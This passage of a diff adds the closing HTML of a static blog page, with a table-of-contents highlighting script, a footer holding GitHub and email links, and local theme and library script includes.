+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/c2a133d2831ea2cdcf9e4a77e2ee69a3.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
